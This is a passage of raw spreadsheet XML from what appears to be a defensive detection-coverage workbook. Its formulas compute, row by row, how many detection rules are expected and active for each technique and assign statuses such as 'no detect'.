      <c r="D264" t="s">
        <v>6</v>
      </c>
      <c r="E264" t="s">
        <v>815</v>
      </c>
      <c r="F264" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G264" s="9" cm="1">
        <f t="array" ref="G264">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H264" s="9" t="str" cm="1">
        <f t="array" ref="H264">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I264" s="9" t="str" cm="1">
        <f t="array" ref="I264">IF(SUM(IF($C264=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C264=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J264" s="9" t="str" cm="1">
        <f t="array" ref="J26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64" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M264" s="9" cm="1">
        <f t="array" ref="M264">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N264" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O264" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P264" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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64" t="s">
        <v>386</v>
      </c>
      <c r="U264" t="s">
        <v>1409</v>
      </c>
      <c r="V264" t="s">
        <v>1406</v>
      </c>
      <c r="W264" t="b">
        <v>1</v>
      </c>
      <c r="X264" t="s">
        <v>1404</v>
      </c>
    </row>
    <row r="265" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A265" t="s">
        <v>1404</v>
      </c>
      <c r="B265" t="s">
        <v>1410</v>
      </c>
      <c r="C265" t="s">
        <v>1411</v>
      </c>
      <c r="D265" t="s">
        <v>6</v>
      </c>
      <c r="E265" t="s">
        <v>815</v>
      </c>
      <c r="F265" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G265" s="9" cm="1">
        <f t="array" ref="G265">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H265" s="9" t="str" cm="1">
        <f t="array" ref="H265">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I265" s="9" t="str" cm="1">
        <f t="array" ref="I265">IF(SUM(IF($C265=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C265=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J265" s="9" t="str" cm="1">
        <f t="array" ref="J26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65" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M265" s="9" cm="1">
        <f t="array" ref="M265">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N265" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O265" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P265" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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65" t="s">
        <v>386</v>
      </c>
      <c r="U265" t="s">
        <v>1412</v>
      </c>
      <c r="W265" t="b">
        <v>1</v>
      </c>
      <c r="X265" t="s">
        <v>1404</v>
      </c>
    </row>
    <row r="266" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A266" t="s">
        <v>1413</v>
      </c>
      <c r="B266" t="s">
        <v>1413</v>
      </c>
      <c r="C266" t="s">
        <v>45</v>
      </c>
      <c r="D266" t="s">
        <v>8</v>
      </c>
      <c r="E266" t="s">
        <v>1009</v>
      </c>
      <c r="F266" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G266" s="9" cm="1">
        <f t="array" ref="G266">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H266" s="9" cm="1">
        <f t="array" ref="H266">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I266" s="9" t="str" cm="1">
        <f t="array" ref="I266">IF(SUM(IF($C266=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C266=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J266" s="9" t="str" cm="1">
        <f t="array" ref="J26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66" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M266" s="9" cm="1">
        <f t="array" ref="M266">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N266" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O266" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P266" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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66" t="s">
        <v>368</v>
      </c>
      <c r="U266" t="s">
        <v>1414</v>
      </c>
      <c r="V266" t="s">
        <v>1415</v>
      </c>
      <c r="W266" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="267" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A267" t="s">
        <v>1416</v>
      </c>
      <c r="B267" t="s">
        <v>1416</v>
      </c>
      <c r="C267" t="s">
        <v>210</v>
      </c>
      <c r="D267" t="s">
        <v>6</v>
      </c>
      <c r="E267" t="s">
        <v>1417</v>
      </c>
      <c r="F267" s="9">
        <f t="shared" si="4"/>
        <v>7</v>
      </c>
      <c r="G267" s="9" cm="1">
        <f t="array" ref="G267">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H267" s="9" cm="1">
        <f t="array" ref="H267">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>14</v>
      </c>
      <c r="I267" s="9" t="str" cm="1">
        <f t="array" ref="I267">IF(SUM(IF($C267=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C267=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J267" s="9" cm="1">
        <f t="array" ref="J26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267" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>14</v>
      </c>
      <c r="M267" s="9" cm="1">
        <f t="array" ref="M267">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>14</v>
      </c>
      <c r="N267" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O267" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P267" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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67" t="s">
        <v>368</v>
      </c>
      <c r="U267" t="s">
        <v>1418</v>
      </c>
      <c r="V267" t="s">
        <v>1419</v>
      </c>
      <c r="W267" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="268" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A268" t="s">
        <v>1416</v>
      </c>
      <c r="B268" t="s">
        <v>1420</v>
      </c>
      <c r="C268" t="s">
        <v>1421</v>
      </c>
      <c r="D268" t="s">
        <v>6</v>
      </c>
      <c r="E268" t="s">
        <v>1422</v>
      </c>
      <c r="F268" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G268" s="9" cm="1">
        <f t="array" ref="G268">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H268" s="9" t="str" cm="1">
        <f t="array" ref="H268">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I268" s="9" t="str" cm="1">
        <f t="array" ref="I268">IF(SUM(IF($C268=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C268=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J268" s="9" t="str" cm="1">
        <f t="array" ref="J26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68" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M268" s="9" cm="1">
        <f t="array" ref="M268">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N268" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O268" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P268" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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68" t="s">
        <v>386</v>
      </c>
      <c r="U268" t="s">
        <v>1423</v>
      </c>
      <c r="V268" t="s">
        <v>1424</v>
      </c>
      <c r="W268" t="b">
        <v>1</v>
      </c>
      <c r="X268" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="269" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A269" t="s">
        <v>1416</v>
      </c>
      <c r="B269" t="s">
        <v>1425</v>
      </c>
      <c r="C269" t="s">
        <v>1426</v>
      </c>
      <c r="D269" t="s">
        <v>6</v>
      </c>
      <c r="E269" t="s">
        <v>1427</v>
      </c>
      <c r="F269" s="9">
        <f t="shared" si="4"/>
        <v>6</v>
      </c>
      <c r="G269" s="9" cm="1">
        <f t="array" ref="G269">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H269" s="9" t="str" cm="1">
        <f t="array" ref="H269">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I269" s="9" t="str" cm="1">
        <f t="array" ref="I269">IF(SUM(IF($C269=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C269=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J269" s="9" t="str" cm="1">
        <f t="array" ref="J26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69" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M269" s="9" cm="1">
        <f t="array" ref="M269">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N269" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O269" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P269" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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69" t="s">
        <v>386</v>
      </c>
      <c r="U269" t="s">
        <v>1428</v>
      </c>
      <c r="V269" t="s">
        <v>1429</v>
      </c>
      <c r="W269" t="b">
        <v>1</v>
      </c>
      <c r="X269" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="270" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A270" t="s">
        <v>1416</v>
      </c>
      <c r="B270" t="s">
        <v>1430</v>
      </c>
      <c r="C270" t="s">
        <v>1431</v>
      </c>
      <c r="D270" t="s">
        <v>6</v>
      </c>
      <c r="E270" t="s">
        <v>1432</v>
      </c>
      <c r="F270" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G270" s="9" cm="1">
        <f t="array" ref="G270">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H270" s="9" t="str" cm="1">
        <f t="array" ref="H270">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I270" s="9" t="str" cm="1">
        <f t="array" ref="I270">IF(SUM(IF($C270=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C270=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J270" s="9" t="str" cm="1">
        <f t="array" ref="J27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70" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M270" s="9" cm="1">
        <f t="array" ref="M270">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N270" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O270" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P270" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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70" t="s">
        <v>386</v>
      </c>
      <c r="U270" t="s">
        <v>1433</v>
      </c>
      <c r="V270" t="s">
        <v>1434</v>
      </c>
      <c r="W270" t="b">
        <v>1</v>
      </c>
      <c r="X270" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="271" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A271" t="s">
        <v>1416</v>
      </c>
      <c r="B271" t="s">
        <v>1435</v>
      </c>
      <c r="C271" t="s">
        <v>1436</v>
      </c>
      <c r="D271" t="s">
        <v>6</v>
      </c>
      <c r="E271" t="s">
        <v>463</v>
      </c>
      <c r="F271" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G271" s="9" cm="1">
        <f t="array" ref="G271">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H271" s="9" t="str" cm="1">
        <f t="array" ref="H271">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I271" s="9" t="str" cm="1">
        <f t="array" ref="I271">IF(SUM(IF($C271=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C271=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J271" s="9" t="str" cm="1">
        <f t="array" ref="J27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71" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M271" s="9" cm="1">
        <f t="array" ref="M271">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N271" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O271" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P271" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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71" t="s">
        <v>386</v>
      </c>
      <c r="U271" t="s">
        <v>1437</v>
      </c>
      <c r="V271" t="s">
        <v>1438</v>
      </c>
      <c r="W271" t="b">
        <v>1</v>
      </c>
      <c r="X271" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="272" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A272" t="s">
        <v>1416</v>
      </c>
      <c r="B272" t="s">
        <v>1439</v>
      </c>
      <c r="C272" t="s">
        <v>1440</v>
      </c>
      <c r="D272" t="s">
        <v>6</v>
      </c>
      <c r="E272" t="s">
        <v>1441</v>
      </c>
      <c r="F272" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G272" s="9" cm="1">
        <f t="array" ref="G272">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H272" s="9" t="str" cm="1">
        <f t="array" ref="H272">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I272" s="9" t="str" cm="1">
        <f t="array" ref="I272">IF(SUM(IF($C272=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C272=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J272" s="9" t="str" cm="1">
        <f t="array" ref="J27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72" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M272" s="9" cm="1">
        <f t="array" ref="M272">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N272" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O272" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P272" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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72" t="s">
        <v>386</v>
      </c>
      <c r="U272" t="s">
        <v>1442</v>
      </c>
      <c r="V272" t="s">
        <v>1443</v>
      </c>
      <c r="W272" t="b">
        <v>1</v>
      </c>
      <c r="X272" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="273" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A273" t="s">
        <v>1416</v>
      </c>
      <c r="B273" t="s">
        <v>1444</v>
      </c>
      <c r="C273" t="s">
        <v>1445</v>
      </c>
      <c r="D273" t="s">
        <v>6</v>
      </c>
      <c r="E273" t="s">
        <v>1446</v>
      </c>
      <c r="F273" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G273" s="9" cm="1">
        <f t="array" ref="G273">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H273" s="9" t="str" cm="1">
        <f t="array" ref="H273">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I273" s="9" t="str" cm="1">
        <f t="array" ref="I273">IF(SUM(IF($C273=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C273=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J273" s="9" t="str" cm="1">
        <f t="array" ref="J27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73" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M273" s="9" cm="1">
